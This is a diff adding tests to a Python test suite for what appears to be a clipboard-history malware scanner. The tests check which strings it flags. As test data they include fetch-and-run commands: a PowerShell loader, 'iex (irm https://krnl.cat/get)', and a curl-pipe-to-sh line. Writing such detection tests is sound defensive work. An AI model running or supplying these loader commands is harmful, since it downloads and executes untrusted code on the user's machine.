@@ -55,6 +55,34 @@ class TestClassify:
         m, _ = ch._classify("telador scan_clipboard changelog combatroblox")
         assert m is None
 
+    def test_curl_tutorial_not_flagged(self):
+        """curl/wget em tutorial legítimo = ruído de clipboard, não hit."""
+        import clipboard_history_scanner as ch
+        m, _ = ch._classify("curl https://get.docker.com | sh")
+        assert m is None
+        m, _ = ch._classify("In this tutorial we will use curl to download the file")
+        assert m is None
+
+    def test_downloadstring_docs_not_flagged(self):
+        """Snippet .NET com nome DownloadString sem payload = FP clássico."""
+        import clipboard_history_scanner as ch
+        m, _ = ch._classify("function DownloadString() { return data; }")
+        assert m is None
+
+    def test_iex_without_url_not_flagged(self):
+        """Fragmento 'iex' solto sem URL = incompleto / ruído."""
+        import clipboard_history_scanner as ch
+        m, _ = ch._classify("remember to use iex carefully")
+        assert m is None
+
+    def test_real_loader_still_flagged(self):
+        import clipboard_history_scanner as ch
+        m, sev = ch._classify("iex (irm https://krnl.cat/get)")
+        assert m is not None
+        assert sev == "high"
+        m, sev = ch._classify("https://krnl.cat/get")
+        assert m is not None
+
 
 class TestScanDisk:
     def test_historydata_hit(self):
